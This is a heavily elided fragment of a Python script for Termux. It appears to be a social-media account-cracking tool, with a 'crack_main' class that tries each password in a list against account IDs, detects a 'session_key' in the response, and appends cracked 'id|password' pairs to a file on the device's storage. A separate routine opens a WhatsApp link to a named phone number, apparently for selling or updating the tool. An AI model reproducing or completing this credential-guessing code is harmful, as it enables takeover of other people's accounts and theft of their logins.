...
def qsbuy():
        ...
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+92+3476858551?text={bumper}")
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r[SKK] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[SKK-OK] '+roid+' | '+pas+'\033[0;97m')

                                        open('/sdcard/SKK_ok.txt','a').write(roid+'|'+pas+'\n')
